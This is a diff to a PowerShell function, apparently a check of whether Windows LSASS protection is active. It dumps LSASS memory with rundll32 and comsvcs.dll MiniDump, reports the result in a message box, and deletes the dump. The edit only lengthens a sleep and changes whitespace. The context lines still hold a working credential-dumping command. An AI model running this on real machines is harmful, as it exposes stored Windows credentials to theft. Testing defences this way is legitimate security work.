@@ -31,7 +31,7 @@ function Invoke-LsassDump1 {
 		if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
 			$fileName = [System.IO.Path]::GetTempFileName();
 			.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id $fileName full
-			Start-Sleep 3
+			Start-Sleep 5
 			If ((Get-Item $fileName).length -gt 0kb) {
 				[System.Windows.MessageBox]::Show('Lsass dump worked - '+$fileName);
 				Remove-Item $fileName
@@ -39,11 +39,8 @@ function Invoke-LsassDump1 {
 				[System.Windows.MessageBox]::Show('Lsass is protected');
 			}
 		}else{
-			
-			[System.Windows.MessageBox]::Show('You have to be Administrator');	
-			
-		}
-		
+			[System.Windows.MessageBox]::Show('You have to be Administrator');		
+		}	
     }
 
 }
